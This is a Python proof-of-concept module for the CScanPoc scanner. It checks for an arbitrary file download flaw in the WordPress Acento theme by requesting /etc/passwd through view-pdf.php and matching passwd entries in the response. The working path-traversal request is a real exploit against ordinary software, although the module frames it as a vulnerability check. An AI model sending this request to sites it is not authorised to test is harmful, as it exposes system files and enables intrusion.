# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'WordPress_0073' # 平台漏洞编号，留空
    name = 'WordPress Acento主题 任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-09-08'  # 漏洞公布时间
    desc = '''
        wp主题插件acento theme 中view-pad.php 文件,可读取任意文件
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/34578/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Acento主题'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7cdac555-edc5-4c65-b5a0-08ebf546b4a5'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            verify_url = '{target}'.format(target=self.target)+"/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/etc/passwd"
     

            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            content = response.read()
            if 'root:' in content and 'nobody:' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()
        

if __name__ == '__main__':
    Poc().run()